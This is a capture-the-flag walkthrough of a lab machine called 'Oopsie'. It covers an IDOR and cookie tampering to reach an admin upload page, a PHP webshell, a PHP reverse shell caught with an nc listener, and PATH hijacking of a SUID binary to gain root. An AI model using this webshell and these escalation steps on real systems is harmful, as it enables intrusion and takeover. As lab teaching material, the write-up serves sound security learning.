# OOPSIE

STARTING POINT - TIER 2

## Enumeration

**Nmap scan**

```bash
nmap -sC -sV 10.129.24.202
```

![nmap](pics/nmap.png)

## Exploitation

**Check page-source**

![ps](pics/ps.png)

- Suspicious directory `/cdn-cgi/login`

**Access `/cdn-cgi/login`**

![web1](pics/web1.png)

![web2](pics/web2.png)

- Login as Guest

![web3](pics/web3.png)

- Look at the url `http://10.129.24.202/cdn-cgi/login/admin.php?content=accounts&id=2`. What if we change the `id` to `id=1`?

![web4](pics/web4.png)

- BOOM!!!

![web5](pics/web5.png)

- I realized that website cookies are saved using the user's Access ID. So let's change it to admin's Access ID and refresh the website to see the result.

![web6](pics/web6.png)

![web7](pics/web7.png)

- Now you can access to uploads page.

**Create a simple webshell `webshell.php`**

```bash
<?php system($_GET["cmd"]); ?>
```

**Directories scanning**

```bash
gobuster dir -u http://10.129.24.202/ -w /usr/share/dirb/wordlists/small.txt -x php
```

![go](pics/go.png)

**Access to endpoint `/uploads`**

`http://10.129.24.202/uploads/webshell.php`

![shell1](pics/shell1.png)

- Successfully access webshell then RCE the server.

![shell2](pics/shell2.png)

- `cmd=ls /home/robert`

**Read file**

`cmd=ls /home/robert/user.txt`

**Let's upload a reverse shell into the server**

- You can find a reverse shell in `/usr/share/webshells/php/php-reverse-shell.php`.

![rshell](pics/rshell.png)

- Change these 2 lines.

**Upload webshell and connect**

```bash
nc -lnvp 4444
```

`http://10.129.24.202/uploads/php-reverse-shell.php`

![rshell2](pics/rshell2.png)

**Upgrade shell to `/bin/bash`**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![bash](pics/bash.png)

**Read file is shared with robert user**

![read](pics/read.png)

**Switch to robert user**

```bash
su robert
```

![robert1](pics/robert1.png)

![robert2](pics/robert2.png)

- Found interested group

**Access `/usr/bin/bugtracker`**

![bug1](pics/bug1.png)

![bug2](pics/bug2.png)

**Privileges Escalation**

```bash
robert@oopsie:/tmp$ echo "/bin/sh" > cat
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
robert@oopsie:/tmp$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
---------------

# whoami
root
```

![priv](pics/priv.png)
